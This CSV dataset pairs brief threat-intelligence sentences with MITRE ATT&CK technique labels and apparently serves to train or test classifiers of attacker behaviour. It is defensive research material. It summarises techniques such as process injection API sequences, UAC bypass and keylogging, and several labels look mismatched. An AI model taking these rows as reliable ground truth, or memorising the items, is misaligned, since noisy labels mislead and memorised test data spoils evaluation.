text,label
can inject into known vulnerable binaries on targeted hosts. ,T1055
dispatcher can establish persistence by registering a new service.,T1543.003
"It then performs SQL queries to retrieve files, file size, folders",T1083
the service account logged into one of the Domain Controllers from the beachhead.,T1078
"After decompiling it from the PE file, it is heavily obfuscated and still almost unreadable.We deobfuscated the script to understand how the infection process works",T1027
can remove strings from binaries.,T1027
has obtained the password for the victim's password manager via a custom keylogger.,T1056.001
can discover files on a local system.,T1083
get decoded and decrypted,T1140
has the ability to take screenshots on a compromised host. ,T1113
"host,",T1082
has encrypted the spearphish attachments to avoid detection from email gateways; the debugger also encrypts information before sending to the C2.,T1027
adds itself to a scheduled task.,T1053.005
has used obfuscated web shells in their operations.,T1027
"capture screenshots,",T1113
"""cmd""  /c",T1059.003
"After obtaining the unique ID from the C2 server, the Trojan calls the “SetAbStatById” method to notify the C2 server of its status of “1” to notify the server it had successfully received the filename and file data",T1041
has the ability to decode and decrypt downloaded files.(Citation: Cybereason Valak May 2020),T1140
the processes used for injection,T1055
"The Trojan uses the first four bytes of this hardware ID as a unique identifier for the system, which in our case was “0000”",T1082
it searches the drives of compromised systems for interesting files,T1083
has used an encrypted Virtual File System to store plugins.,T1027
has used wmi queries to gather information from the system. ,T1047
"additional beacons executed using remote WMIC commands,",T1047
aggregates collected data in a tmp file.,T1074.001
backdoor has used Windows services as a way to execute its malicious payload. ,T1569.002
has the ability to list drives on the infected host.,T1083
exfiltrates data collected from the victim mobile device.,T1005
The actors exploited Log4Shell for initial access to the organization’s VMware Horizon server.,T1190
can inject its payload DLL Into memory.,T1055
has the ability to respawn itself using ShellExecuteW and CreateProcessW.,T1106
A  tool can use WMI to execute a binary.,T1047
has used several Windows API functions throughout the encryption process including IsDebuggerPresent TerminateProcess Process32FirstW among others.,T1106
used HTTP to download payloads for CVE-2019-19781 and CVE-2020-10189 exploits. ,T1071.001
"KopiLuwak In November 2016, Kaspersky Lab observed a new round of weaponized macro documents that dropped a new, heavily obfuscated Javascript payload that we named KopiLuwak (one of the rarest and most expensive types of coffee in the world)",T1027
can uninstall itself from compromised hosts as well create and modify directories delete move copy and rename files.,T1070.004
Detect and Identify source IP,T1016
can download additional payloads to a target system.,T1105
can use the `ShowWindow` API to avoid detection.,T1106
malicious actor signing in to a Microsoft 365 account,T1078
can download and execute additional files.,T1105
Registry key “SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System ” is queried to check the values ConsentPromptBehaviorAdmin and PromptOnSecureDesktop,T1012
http/https data transfer,T1071.001
can encrypt sections of its code to evade detection.,T1027
"plugins such as a keylogger,",T1056.001
had to receive an HTTP GET request containing a specific set of parameters in order to execute.(Citation: Guidepoint SUPERNOVA Dec 2020),T1071.001
The decrypted payload,T1140
adds the HIDDEN file attribute to the file:,T1564.001
can collect host IP information from the victims machine.,T1016
has used the Fodhelper UAC bypass technique to gain elevated privileges.,T1548.002
"Even if the arsenal of this actor is diverse, we have identified some patterns, copy-paste code from various public repositories and similarities between the different piece of code",T1140
can collect data such as PowerPoint files Word documents Excel files PDF files text files database files and image files from an infected machine.,T1005
can collect information from a compromised host.,T1005
can collect the local hostname operating system details CPU speed and total physical memory. ,T1082
can execute commands from its C2 server.,T1059.003
has used HTTP GET and POST requests over port 443 for C2.,T1071.001
has exfiltrated data over its C2 channel.,T1041
Read (IRP_MJ_READ) for the keyboard driver (kbdclass or KeyboardClass0),T1056.001
can use WMI to deliver a payload to a remote host.,T1047
can download files to specified targets.,T1105
to a side-loading vulnerability that,T1574.002
used several tools for retrieving login and password information including LaZagne.,T1552.001
uses AES to encrypt certain information sent over its C2 channel.,T1573.001
One of the observed commands invoked via WMI was ‘firefox.exe’.,T1047
"To optimize brute forcing efforts, the malware compares the server prompt upon connection to a hardcoded list of strings",T1110
has deleted certain values from the Registry to load a malicious DLL. ,T1112
has a command ps to obtain a listing of processes on the system. ,T1057
stores information gathered from the endpoint in a file named 1.hwp.,T1074.001
hides any strings related to its own indicators of compromise.,T1027
Delivery TG-3390 conducts SWCs or sends spearphishing emails with ZIP archive attachments,T1566.001
can obtain file and directory listings.,T1083
Tactical RMM is a remote management software platform that uses a combination of agents to allow for remote management and access to systems.,T1219
has collected the username from the infected host. ,T1033
has used HTTP in outbound communications.,T1071.001
kills anti-virus found on the victim.,T1562.001
has the ability to modify the Registry on compromised hosts using RegDeleteValueA and RegCreateKeyExA.,T1112
This technique is called self-injection or PE overwrite,T1055
This is sent to the server along with the computer’s name,T1082
has the ability to modify a Registry Run key to establish persistence.(Citation: Trend Micro DRBControl February 2020),T1547.001
has used SchTasks for execution.,T1053.005
cyber actors also used on-premises Identity and Access Management (IdAM) and federation services in hybrid cloud environments in order to pivot to cloud resources.,T1078
can use `VirtualAlloc` `WriteProcessMemory` and then `CreateRemoteThread` to execute shellcode within the address space of `Notepad.exe`.,T1055
can create registry keys to load driver files.,T1112
deployed additional tools,T1105
can check for the presence of specific files prior to moving to the next phase of execution.,T1083
 can use `cmd.exe` to execute a created batch file.,T1059.003
